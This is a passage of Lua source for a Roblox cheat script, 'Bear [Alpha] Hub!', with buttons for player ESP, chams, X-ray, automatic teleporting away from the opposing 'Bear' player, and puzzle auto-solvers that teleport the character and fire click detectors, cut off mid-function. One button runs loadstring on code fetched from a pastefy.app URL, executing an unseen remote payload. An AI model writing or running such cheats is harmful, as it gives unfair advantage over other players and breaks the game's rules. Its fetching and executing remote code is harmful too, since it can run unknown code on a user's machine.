	buttonLayout.CellPadding = UDim2.new(0, 5, 0, 5)
	buttonLayout.SortOrder = Enum.SortOrder.LayoutOrder
	buttonLayout.Parent = buttonsFrame

	local buttons = {}

	for i, option in ipairs(options) do
		local btn = Instance.new("TextButton")
		btn.Name = option
		btn.BackgroundColor3 = option == currentOption and Color3.fromRGB(100, 150, 255) or Color3.fromRGB(45, 45, 55)
		btn.Text = option
		btn.TextColor3 = Color3.fromRGB(255, 255, 255)
		btn.TextSize = 12
		btn.Font = Enum.Font.Gotham
		btn.LayoutOrder = i
		btn.Parent = buttonsFrame

		local btnCorner = Instance.new("UICorner")
		btnCorner.CornerRadius = UDim.new(0, 6)
		btnCorner.Parent = btn

		buttons[option] = btn

		btn.MouseButton1Click:Connect(function()
			for _, button in pairs(buttons) do
				button.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
			end
			btn.BackgroundColor3 = Color3.fromRGB(100, 150, 255)
			callback(option)
		end)
	end

	return groupFrame
end

local function createResetButton(parent, layoutOrder)
	local btn = Instance.new("TextButton")
	btn.Name = "ResetButton"
	btn.Size = UDim2.new(1, 0, 0, 40)
	btn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	btn.Text = "RESET ALL SETTINGS"
	btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	btn.TextSize = 14
	btn.Font = Enum.Font.GothamBold
	btn.LayoutOrder = layoutOrder
	btn.Parent = parent

	local btnCorner = Instance.new("UICorner")
	btnCorner.CornerRadius = UDim.new(0, 8)
	btnCorner.Parent = btn

	return btn
end

-- Effects System
local colorCorrection = Instance.new("ColorCorrectionEffect")
colorCorrection.Name = "CustomColorCorrection"
colorCorrection.Parent = Lighting

local bloom = Instance.new("BloomEffect")
bloom.Name = "CustomBloom"
bloom.Intensity = 0
bloom.Size = 24
bloom.Threshold = 2
bloom.Parent = Lighting

local blur = Instance.new("BlurEffect")
blur.Name = "CustomBlur"
blur.Size = 0
blur.Parent = Lighting

local sunRays = Instance.new("SunRaysEffect")
sunRays.Name = "CustomSunRays"
sunRays.Intensity = 0
sunRays.Spread = 1
sunRays.Parent = Lighting

-- Apply Effects Function
local function applyEffects()
	-- Custom Preset
	colorCorrection.Brightness = settings.brightness / 100
	colorCorrection.Contrast = settings.contrast / 100
	colorCorrection.Saturation = settings.saturation / 100
	blur.Size = settings.blur

	-- World Mode
	if settings.worldMode == "Monochromatic" then
		colorCorrection.Saturation = -1
		colorCorrection.TintColor = Color3.fromRGB(255, 255, 255)
	elseif settings.worldMode == "Saturatic" then
		colorCorrection.Saturation = 0.5
		colorCorrection.TintColor = Color3.fromRGB(255, 255, 255)
	elseif settings.worldMode == "Glitchic" then
		if not settings.glitchRotationApplied then
			camera.CFrame = camera.CFrame * CFrame.Angles(0, math.rad(10), 0)
			settings.glitchRotationApplied = true
		end
		local glitchColors = {
			Color3.fromRGB(255, 100, 255),
			Color3.fromRGB(100, 255, 255),
			Color3.fromRGB(255, 255, 100)
		}
		colorCorrection.TintColor = glitchColors[math.random(1, #glitchColors)]
		colorCorrection.Contrast = 0.2
	else
		colorCorrection.TintColor = Color3.fromRGB(255, 255, 255)
	end

	-- POV Mode
	if settings.povMode == "Vivid" then
		bloom.Intensity = 0.5
		colorCorrection.Saturation = math.max(colorCorrection.Saturation, 0.3)
		colorCorrection.Contrast = 0.1
	elseif settings.povMode == "Cinema" then
		-- Darken + contrast 25%
		colorCorrection.Contrast = 0.25
		colorCorrection.Brightness = -0.25
		sunRays.Intensity = 0
	elseif settings.povMode == "Realistic" then
		-- Enhance textures/shine
		bloom.Intensity = 0.2
		colorCorrection.Contrast = 0.2
		colorCorrection.Saturation = 0.05
		sunRays.Intensity = 0.1
	else
		if settings.worldMode == "Normal" then
			bloom.Intensity = 0
			sunRays.Intensity = 0
		end
	end
end

-- Glitch Effect Loop
local glitchTimer = 0
RunService.RenderStepped:Connect(function(dt)
	if settings.worldMode == "Glitchic" then
		glitchTimer = glitchTimer + dt
		if glitchTimer > 0.1 then
			glitchTimer = 0
			local glitchColors = {
				Color3.fromRGB(255, 100, 255),
				Color3.fromRGB(100, 255, 255),
				Color3.fromRGB(255, 255, 100),
				Color3.fromRGB(255, 255, 255)
			}
			colorCorrection.TintColor = glitchColors[math.random(1, #glitchColors)]
			if math.random() > 0.7 then
				colorCorrection.Contrast = math.random(-20, 40) / 100
			end
		end
	end
end)

-- Build GUI
createSection("Custom Preset", contentFrame, 1)

createSlider("Brightness", -100, 100, settings.brightness, function(value)
	settings.brightness = value
	applyEffects()
end, contentFrame, 2)

createSlider("Contrast", -100, 100, settings.contrast, function(value)
	settings.contrast = value
	applyEffects()
end, contentFrame, 3)

createSlider("Saturation", -100, 100, settings.saturation, function(value)
	settings.saturation = value
	applyEffects()
end, contentFrame, 4)

createSlider("Blur", 0, 20, settings.blur, function(value)
	settings.blur = value
	applyEffects()
end, contentFrame, 5)

createSection("World Mode", contentFrame, 6)

createButtonGroup("World", {"Normal", "Monochromatic", "Saturatic", "Glitchic"}, settings.worldMode, function(mode)
	settings.worldMode = mode
	applyEffects()
end, contentFrame, 7)

createSection("POV Mode", contentFrame, 8)

createButtonGroup("POV", {"Normal", "Vivid", "Cinema", "Realistic"}, settings.povMode, function(mode)
	settings.povMode = mode
	applyEffects()
end, contentFrame, 9)

createSection("", contentFrame, 10)

local resetBtn = createResetButton(contentFrame, 11)
resetBtn.MouseButton1Click:Connect(function()
	settings.brightness = 0
	settings.contrast = 0
	settings.saturation = 0
	settings.blur = 0
	settings.worldMode = "Normal"
	settings.povMode = "Normal"

	-- Reset effects without destroying GUI
	applyEffects()
	print("All settings reset!")
end)

-- Minimize Functionality
local minimizedSize = UDim2.new(0, 200, 0, 40)
local expandedSize = UDim2.new(0, 400, 0, 500)

minimizeBtn.MouseButton1Click:Connect(function()
	settings.minimized = not settings.minimized
	local targetSize = settings.minimized and minimizedSize or expandedSize
	local tween = TweenService:Create(mainFrame, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {Size = targetSize})
	tween:Play()
	contentFrame.Visible = not settings.minimized
	minimizeBtn.Text = settings.minimized and "+" or "-"
end)

-- Save GUI Position
mainFrame:GetPropertyChangedSignal("Position"):Connect(function()
	settings.guiPosition = mainFrame.Position
end)

-- Persist settings on respawn
player.CharacterAdded:Connect(function()
	wait(1)
	applyEffects()
end)

-- Initial apply
applyEffects()
print("Bear [Alpha] Hub!: Presets Changer Activated✔")
end,
})
 
local Divider = Tab:CreateDivider()

local Section = Tab:CreateSection("Visual Things")

local Button = Tab:CreateButton({
Name = "Toggle Name ESP",
Callback = function()
    -- Global variable to track the ESP state
    _G.IsNameESPActive = _G.IsNameESPActive or false
    _G.IsNameESPActive = not _G.IsNameESPActive -- Toggle the state
    
    local Players = game:GetService("Players")
    local Teams = game:GetService("Teams")
    local LocalPlayer = Players.LocalPlayer
    
    -- Function to create the BillboardGui ESP
    local function createBillboardGui(character)
        local player = Players:GetPlayerFromCharacter(character)
        -- Stop if it's the LocalPlayer
        if player == LocalPlayer then 
            return 
        end
    
        local head = character:FindFirstChild("Head")
        if head then
            -- Remove existing BillboardGui if it exists (for a clean update)
            local existingGui = head:FindFirstChild("BearESP")
            if existingGui then
                existingGui:Destroy()
            end
            
            if _G.IsNameESPActive then -- Only create if active
                local billboardGui = Instance.new("BillboardGui")
                billboardGui.Name = "BearESP"
                billboardGui.AlwaysOnTop = true
                billboardGui.MaxDistance = 9999999999999
                billboardGui.Size = UDim2.new(0, 200, 0, 50)
                billboardGui.Adornee = head
                billboardGui.Parent = head
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Size = UDim2.new(1, 0, 1, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.Text = character.Name
                textLabel.Parent = billboardGui
            
                if player then
                    if player.Team and player.Team.Name == "Bear" then
                        textLabel.TextColor3 = Color3.new(1, 0, 0) -- Red (Bear)
                    else
                        textLabel.TextColor3 = Color3.new(1, 1, 1) -- White (Survivor/Other)
                    end
                end
            end
        end
    end
    
    -- Function to clear all ESP Guis
    local function clearAllESP()
        for _, player in Players:GetPlayers() do
            local character = player.Character
            if character then
                local head = character:FindFirstChild("Head")
                if head then
                    local existingGui = head:FindFirstChild("BearESP")
                    if existingGui then
                        existingGui:Destroy()
                    end
                end
            end
        end
    end

    -- Update ESP for all existing players
    local function updateAllPlayersESP()
        for _, player in Players:GetPlayers() do
            local character = player.Character
            if character then
                createBillboardGui(character)
            end
        end
    end
    
    -- Global connections table to manage listeners
    _G.ESPConnections = _G.ESPConnections or {}
    
    if _G.IsNameESPActive then
        -- Activation Logic
        
        -- 1. Create ESP for current characters
        updateAllPlayersESP()
        
        -- 2. Connect new listeners (disconnect old ones first if any remain)
        for _, conn in ipairs(_G.ESPConnections) do conn:Disconnect() end
        _G.ESPConnections = {}

        -- Listener for new players and character respawns
        local playerAddedConn = Players.PlayerAdded:Connect(function(player)    
            local charAddedConn = player.CharacterAdded:Connect(createBillboardGui)    
            table.insert(_G.ESPConnections, charAddedConn)
        end)
        table.insert(_G.ESPConnections, playerAddedConn)

        for _, player in Players:GetPlayers() do
            if player ~= LocalPlayer then
                local charAddedConn = player.CharacterAdded:Connect(createBillboardGui)
                table.insert(_G.ESPConnections, charAddedConn)
            end
        end

        -- 3. Run the periodic update loop (if not already running)
        -- We'll just rely on the PlayerAdded/CharacterAdded for simplicity
        -- The original script's 5s update loop:
        _G.ESPUpdateTask = task.spawn(function()    
            while _G.IsNameESPActive do    
                task.wait(5)    
                if _G.IsNameESPActive then
                    updateAllPlayersESP()    
                end
            end
            _G.ESPUpdateTask = nil
        end)
        
        Rayfield:Notify({    
            Title = "Bear [Alpha] Hub!",
            Content = "Name ESP is **Active**!",
            Duration = 2,
            Image = "check",
        })    
        print("Bear [Alpha] Hub!: Name ESP Activated!")
        
    else
        -- Deactivation Logic
        
        -- 1. Disconnect all listeners
        for _, conn in ipairs(_G.ESPConnections) do conn:Disconnect() end
        _G.ESPConnections = {}
        
        -- 2. Clear all existing ESP visuals
        clearAllESP()
        
        -- 3. Stop the periodic update loop (by setting IsNameESPActive to false, the loop will exit)
        -- Note: We don't need to explicitly stop the task as the `while _G.IsNameESPActive` loop will stop it.
        
        Rayfield:Notify({    
            Title = "Bear [Alpha] Hub!",
            Content = "Name ESP is **Inactive**!",
            Duration = 2,
            Image = "x",
        })    
        print("Bear [Alpha] Hub!: Name ESP Deactivated!")
    end
end,
})

local Button = Tab:CreateButton({
Name = "Chams",
Callback = function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- UI Setup (Draggable & Minimizable)
if PlayerGui:FindFirstChild("ChamsGui") then PlayerGui.ChamsGui:Destroy() end
local gui = Instance.new("ScreenGui", PlayerGui)
gui.Name = "ChamsGui"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 200, 0, 70)
frame.Position = UDim2.new(0.5, -100, 0.2, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
title.Text = "Chams ESP"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 14
Instance.new("UICorner", title)

-- Toggle Button
local toggleBtn = Instance.new("TextButton", frame)
toggleBtn.Size = UDim2.new(0.9, 0, 0, 30)
toggleBtn.Position = UDim2.new(0.05, 0, 0.45, 0)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
toggleBtn.Text = "OFF"
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", toggleBtn)

local isEnabled = false

-- Minimize Button
local minBtn = Instance.new("TextButton", frame)
minBtn.Size = UDim2.new(0, 25, 0, 25)
minBtn.Position = UDim2.new(1, -30, 0, 2.5)
minBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
minBtn.Text = "-"
minBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", minBtn)

local isMinimized = false
minBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    frame:TweenSize(isMinimized and UDim2.new(0, 200, 0, 30) or UDim2.new(0, 200, 0, 70), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2)
    toggleBtn.Visible = not isMinimized
end)

-- Chams Logic
local function createHighlight(character)
    if not isEnabled then return end
    if character == LocalPlayer.Character then return end

    local highlight = Instance.new("Highlight")
    highlight.Name = "PlayerHighlight"
    highlight.FillColor = Color3.fromRGB(255, 0, 0) -- Bear color
    highlight.OutlineColor = Color3.fromRGB(255, 255, 255)
    highlight.FillTransparency = 0.5
    highlight.OutlineTransparency = 0
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    highlight.Parent = character
end

local function clearHighlights()
    for _, player in pairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("PlayerHighlight") then
            player.Character.PlayerHighlight:Destroy()
        end
    end
end

toggleBtn.MouseButton1Click:Connect(function()
    isEnabled = not isEnabled
    toggleBtn.Text = isEnabled and "ON" or "OFF"
    toggleBtn.BackgroundColor3 = isEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    
    if isEnabled then
        for _, player in pairs(Players:GetPlayers()) do
            if player.Character then createHighlight(player.Character) end
            player.CharacterAdded:Connect(createHighlight)
        end
    else
        clearHighlights()
    end
end)

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(createHighlight)
end)
print("Bear [Alpha] Hub!: Chams Activated!")
end,
})

local Button = Tab:CreateButton({
Name = "Disable Round Cutscene GUIs",
Callback = function()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
if not PlayerGui then return end

local function MuteSoundsInGui(gui)
for _, sound in ipairs(gui:GetDescendants()) do
if sound:IsA("Sound") then
sound.Volume = 0
end
end
end

local function CheckForCutscene()    
    local cutscene = PlayerGui:FindFirstChild("Cutscene")    
    local cutsceneDeluxe = PlayerGui:FindFirstChild("CutsceneDeluxe")    
    if cutscene then    
        MuteSoundsInGui(cutscene)    
        cutscene.Enabled = false -- Disable the Cutscene GUI    
    end    
    if cutsceneDeluxe then    
        MuteSoundsInGui(cutsceneDeluxe)    
        cutsceneDeluxe.Enabled = false -- Disable the CutsceneDeluxe GUI    
    end    
end    

-- Initial check    
CheckForCutscene()    

-- Listen for new GUI elements being added    
PlayerGui.ChildAdded:Connect(function(child)    
    if child.Name == "Cutscene" or child.Name == "CutsceneDeluxe" then    
        MuteSoundsInGui(child)    
        child.Enabled = false -- Disable the GUI when added    
    end    
end)    

-- Periodically check every 2 seconds    
task.spawn(function()    
    while true do    
        CheckForCutscene()    
        task.wait(2)    
    end    
end)    
print("Bear [Alpha] Hub!: Cutscene GUIs Disabled✔")
end,
})

local Button = Tab:CreateButton({
Name = "XRay",
Callback = function()
local player = game.Players.LocalPlayer
local PlayerGui = player:WaitForChild("PlayerGui")
local originalTransparencies = {}

-- UI Setup (Draggable & Minimizable)
if PlayerGui:FindFirstChild("XRayGui") then PlayerGui.XRayGui:Destroy() end
local gui = Instance.new("ScreenGui", PlayerGui)
gui.Name = "XRayGui"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 200, 0, 70)
frame.Position = UDim2.new(0.5, -100, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
title.Text = "X-Ray"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 14
Instance.new("UICorner", title)

-- Toggle Button
local toggleBtn = Instance.new("TextButton", frame)
toggleBtn.Size = UDim2.new(0.9, 0, 0, 30)
toggleBtn.Position = UDim2.new(0.05, 0, 0.45, 0)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
toggleBtn.Text = "OFF"
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", toggleBtn)

local isEnabled = false

-- Minimize Button
local minBtn = Instance.new("TextButton", frame)
minBtn.Size = UDim2.new(0, 25, 0, 25)
minBtn.Position = UDim2.new(1, -30, 0, 2.5)
minBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
minBtn.Text = "-"
minBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", minBtn)

local isMinimized = false
minBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    frame:TweenSize(isMinimized and UDim2.new(0, 200, 0, 30) or UDim2.new(0, 200, 0, 70), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2)
    toggleBtn.Visible = not isMinimized
end)

-- X-Ray Logic
local function setXRay(enabled)
    for _, obj in pairs(workspace:GetDescendants()) do
        if obj:IsA("BasePart") and not obj:IsDescendantOf(player.Character) then
            if enabled then
                if not originalTransparencies[obj] then
                    originalTransparencies[obj] = obj.Transparency
                end
                obj.Transparency = 0.5
            else
                if originalTransparencies[obj] then
                    obj.Transparency = originalTransparencies[obj]
                end
            end
        end
    end
end

toggleBtn.MouseButton1Click:Connect(function()
    isEnabled = not isEnabled
    toggleBtn.Text = isEnabled and "ON" or "OFF"
    toggleBtn.BackgroundColor3 = isEnabled and Color3.fromRGB(0, 255, 0) or Color3.fromRGB(255, 0, 0)
    
    setXRay(isEnabled)
end)
print("Bear [Alpha] Hub!: XRay Activated!")
end,
})
local Divider = Tab:CreateDivider()

local Section = Tab:CreateSection("Risky Scripts")

local Button = Tab:CreateButton({
Name = "Teleport away from Bear",
Callback = function()
local player = game.Players.LocalPlayer
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local root = char:WaitForChild("HumanoidRootPart")
local PlayerGui = player:WaitForChild("PlayerGui")

-- Settings
local DISTANCE_THRESHOLD = 25 -- How close Bear needs to be
local TELEPORT_DISTANCE = 26 -- How far to teleport
local CHECK_INTERVAL = 0.5 -- Seconds between checks

-- State
local isEnabled = false

-- UI Setup (Draggable & Minimizable)
if PlayerGui:FindFirstChild("AntiGrabGui") then PlayerGui.AntiGrabGui:Destroy() end
local gui = Instance.new("ScreenGui", PlayerGui)
gui.Name = "AntiGrabGui"
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0, 200, 0, 100)
frame.Position = UDim2.new(0.5, -100, 0.1, 0)
frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
frame.Active = true
frame.Draggable = true
Instance.new("UICorner", frame)

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
title.Text = "Dodge Bear"
title.TextColor3 = Color3.new(1, 1, 1)
title.Font = Enum.Font.SourceSansBold
title.TextSize = 14
Instance.new("UICorner", title)

-- Toggle Button
local toggleBtn = Instance.new("TextButton", frame)
toggleBtn.Size = UDim2.new(0.9, 0, 0, 30)
toggleBtn.Position = UDim2.new(0.05, 0, 0.35, 0)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
toggleBtn.Text = "OFF"
toggleBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", toggleBtn)

local label = Instance.new("TextLabel", frame)
label.Size = UDim2.new(1, 0, 0, 20)
label.Position = UDim2.new(0, 0, 0.7, 0)
label.BackgroundTransparency = 1
label.TextColor3 = Color3.new(1, 1, 1)
label.Text = "Status: Disabled"
label.TextSize = 14

-- Minimize Button
local minBtn = Instance.new("TextButton", frame)
minBtn.Size = UDim2.new(0, 25, 0, 25)
minBtn.Position = UDim2.new(1, -30, 0, 2.5)
minBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
minBtn.Text = "-"
minBtn.TextColor3 = Color3.new(1, 1, 1)
Instance.new("UICorner", minBtn)

local isMinimized = false
minBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    frame:TweenSize(isMinimized and UDim2.new(0, 200, 0, 30) or UDim2.new(0, 200, 0, 100), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2)
    toggleBtn.Visible = not isMinimized
    label.Visible = not isMinimized
end)

-- Toggle Logic
toggleBtn.MouseButton1Click:Connect(function()
    isEnabled = not isEnabled
    if isEnabled then
        toggleBtn.Text = "ON"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
        label.Text = "Status: Active"
        label.TextColor3 = Color3.new(0, 1, 0)
    else
        toggleBtn.Text = "OFF"
        toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        label.Text = "Status: Disabled"
        label.TextColor3 = Color3.new(1, 1, 1)
    end
end)

-- Main Logic Loop
task.spawn(function()
    while task.wait(CHECK_INTERVAL) do
        if isEnabled then
            local bear = nil
            for _, p in pairs(game.Players:GetPlayers()) do
                if p.Team and p.Team.Name == "Bear" and p.Character then
                    bear = p.Character
                    break
                end
            end

            if bear and bear:FindFirstChild("HumanoidRootPart") then
                local bearRoot = bear.HumanoidRootPart
                -- Ensure root is updated if player respawns
                root = player.Character and player.Character:FindFirstChild("HumanoidRootPart") or root
                
                local distance = (root.Position - bearRoot.Position).Magnitude
                
                if distance < DISTANCE_THRESHOLD then
                    label.Text = "Status: TELEPORTING!"
                    label.TextColor3 = Color3.new(1, 0, 0)
                    
                    -- Calculate safe teleport position
                    local direction = (root.Position - bearRoot.Position).Unit
                    local teleportPos = root.Position + (direction * TELEPORT_DISTANCE)
                    
                    root.CFrame = CFrame.new(teleportPos)
                    
                    task.wait(0.5)
                    if isEnabled then
                        label.Text = "Status: Active"
                        label.TextColor3 = Color3.new(0, 1, 0)
                    end
                end
            end
        end
    end
end)
print("Bear [Alpha] Hub!: Teleporter Executed!")
end,
})

local Button = Tab:CreateButton({
Name = "mental breakdown ^^",
Callback = function()
loadstring(game:HttpGet("https://pastefy.app/VgUtLIfQ/raw"))()
end,
})

local Tab = Window:CreateTab("Puzzles", "puzzle")

local Section = Tab:CreateSection("Puzzle Solver") 

local Button = Tab:CreateButton({
 Name = "Complete Wires",
 Callback = function()
 local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local root = char:WaitForChild("HumanoidRootPart")
 local PlayerGui = player:WaitForChild("PlayerGui")

 local MAP = workspace:WaitForChild("Map")

 local LIME = Color3.fromRGB(0, 255, 0)
 local CLICK_SPEED = 0.000000001
 local WAIT_TIME = 8.7

 -- UI Setup
 if PlayerGui:FindFirstChild("AutoPuzzleGui") then PlayerGui.AutoPuzzleGui:Destroy() end
 local gui = Instance.new("ScreenGui", PlayerGui)
 gui.Name = "AutoPuzzleGui"
 gui.ResetOnSpawn = false

 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0, 250, 0, 100)
 frame.Position = UDim2.new(0.5, -125, 0.05, 0)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.Active = true
 frame.Draggable = true
 local corner = Instance.new("UICorner", frame)
 corner.CornerRadius = UDim.new(0, 8)

 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 30)
 title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 title.Text = "Auto Wire"
 title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 16
 Instance.new("UICorner", title)

 local label = Instance.new("TextLabel", frame)
 label.Size = UDim2.new(1, -10, 0, 40)
 label.Position = UDim2.new(0, 5, 0, 40)
 label.BackgroundTransparency = 1
 label.TextColor3 = Color3.new(1, 1, 1)
 label.TextScaled = true
 label.Text = "Idle"

 local minBtn = Instance.new("TextButton", frame)
 minBtn.Size = UDim2.new(0, 25, 0, 25)
 minBtn.Position = UDim2.new(1, -30, 0, 2.5)
 minBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
 minBtn.Text = "-"
 minBtn.TextColor3 = Color3.new(1, 1, 1)
 Instance.new("UICorner", minBtn)

 local isMinimized = false
 minBtn.MouseButton1Click:Connect(function()
 isMinimized = not isMinimized
 frame:TweenSize(isMinimized and UDim2.new(0, 250, 0, 30) or UDim2.new(0, 250, 0, 100), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2)
 label.Visible = not isMinimized
 end)

 local function autoClick()
 for _, name in ipairs({"Wires", "Wire"}) do
 for _, item in ipairs(MAP:GetDescendants()) do
 if item.Name == name then
 local parts = item:IsA("BasePart") and {item} or item:GetDescendants()
 for _, p in ipairs(parts) do
 if p:IsA("BasePart") and p.Transparency < 1 and p.Color ~= LIME then
 local cd = p:FindFirstChildOfClass("ClickDetector")
 if cd then fireclickdetector(cd) end
 end
 end
 end
 end
 end
 end

 local function countdown(seconds, msg)
 local start = tick()
 while tick() - start < seconds do
 local remaining = math.max(0, seconds - (tick() - start))
 label.Text = string.format("%s: %.2fs", msg, remaining)
 autoClick()
 task.wait(CLICK_SPEED)
 end
 end

 local function teleportTo(targetPos)
 if not targetPos then return end
 root.CFrame = CFrame.new(targetPos + Vector3.new(0, 0, -0.3))
 end

 task.spawn(function()
 -- Fix Wires
 local wires = {}
 for _, item in ipairs(MAP:GetDescendants()) do
 if item.Name == "Wire" and item:IsA("Model") then
 table.insert(wires, item)
 end
 end

 if #wires == 0 then
 label.Text = "No wires found!"
 task.wait(2)
 gui:Destroy()
 return
 end

 for i, wire in ipairs(wires) do
 label.Text = "Wire " .. i
 teleportTo(wire:GetPivot().Position)
 countdown(WAIT_TIME, "Fixing")
 end

 label.Text = "Wires Complete!"
 task.wait(2)
 gui:Destroy()
 end)

 print("Bear [Alpha] Hub!: Wire Puzzle Sequence Executed✔")
 end,
})


local Button = Tab:CreateButton({
 Name = "Complete Cheese & Cheese Altar",
 Callback = function()
 local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local root = char:WaitForChild("HumanoidRootPart")
 local PlayerGui = player:WaitForChild("PlayerGui")

 local MAP = workspace:WaitForChild("Map")

 -- UI Setup
 if PlayerGui:FindFirstChild("CheeseGui") then PlayerGui.CheeseGui:Destroy() end
 local gui = Instance.new("ScreenGui", PlayerGui)
 gui.Name = "CheeseGui"
 gui.ResetOnSpawn = false

 local frame = Instance.new("Frame", gui)
 frame.Size = UDim2.new(0, 250, 0, 100)
 frame.Position = UDim2.new(0.5, -125, 0.05, 0)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.Active = true
 frame.Draggable = true
 local corner = Instance.new("UICorner", frame)
 corner.CornerRadius = UDim.new(0, 8)

 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 30)
 title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 title.Text = "Cheese & Altar"
 title.TextColor3 = Color3.new(1, 1, 1)
 title.Font = Enum.Font.SourceSansBold
 title.TextSize = 16
 Instance.new("UICorner", title)

 local label = Instance.new("TextLabel", frame)
 label.Size = UDim2.new(1, -10, 0, 40)
 label.Position = UDim2.new(0, 5, 0, 40)
 label.BackgroundTransparency = 1
 label.TextColor3 = Color3.new(1, 1, 1)
 label.TextScaled = true
 label.Text = "Idle"

 local minBtn = Instance.new("TextButton", frame)
 minBtn.Size = UDim2.new(0, 25, 0, 25)
 minBtn.Position = UDim2.new(1, -30, 0, 2.5)
 minBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
 minBtn.Text = "-"
 minBtn.TextColor3 = Color3.new(1, 1, 1)
 Instance.new("UICorner", minBtn)

 local isMinimized = false
 minBtn.MouseButton1Click:Connect(function()
 isMinimized = not isMinimized
 frame:TweenSize(isMinimized and UDim2.new(0, 250, 0, 30) or UDim2.new(0, 250, 0, 100), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.2)
 label.Visible = not isMinimized
 end)

 local function teleportTo(targetPos)
 if not targetPos then return end
 root.CFrame = CFrame.new(targetPos + Vector3.new(0, 0, -0.3))
 end

 task.spawn(function()
 -- Cheese Step 1: Item pickup
 local altarItem = MAP:FindFirstChild("CheeseAltar", true)
 altarItem = altarItem and altarItem:FindFirstChild("Items", true)
 altarItem = altarItem and altarItem:FindFirstChild("Item", true)
 altarItem = altarItem and altarItem:FindFirstChild("Detect", true)

 if altarItem then
 label.Text = "Going to Cheese..."
 teleportTo(altarItem.Position)
 task.wait(0.87)
 else
 label.Text = "Cheese item not found!"
 task.wait(2)
 gui:Destroy()
 return
 end

 -- Cheese Step 2: Altar base
 local altarBase = MAP:FindFirstChild("CheeseAltar", true)
 altarBase = altarBase and altarBase:FindFirstChild("Base", true)
 altarBase = altarBase and altarBase:FindFirstChild("Detect", true)

 if altarBase then
 label.Text = "Going to Cheese Altar..."
 teleportTo(altarBase.Position)
 task.wait(0.87)
 else
 label.Text = "Cheese Altar not found!"
 task.wait(2)
 gui:Destroy()
 return
 end

 label.Text = "Complete!"
 task.wait(2)
 gui:Destroy()
 end)

 print("Bear [Alpha] Hub!: Cheese & Altar Sequence Executed✔")
 end,
})


local Button = Tab:CreateButton({
 Name = "Complete Hide and Seek (Lone House)",
 Callback = function()
 local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local root = char:WaitForChild("HumanoidRootPart")
 local PlayerGui = player:WaitForChild("PlayerGui")

 local MAP = workspace:WaitForChild("Map")

 -- UI Setup
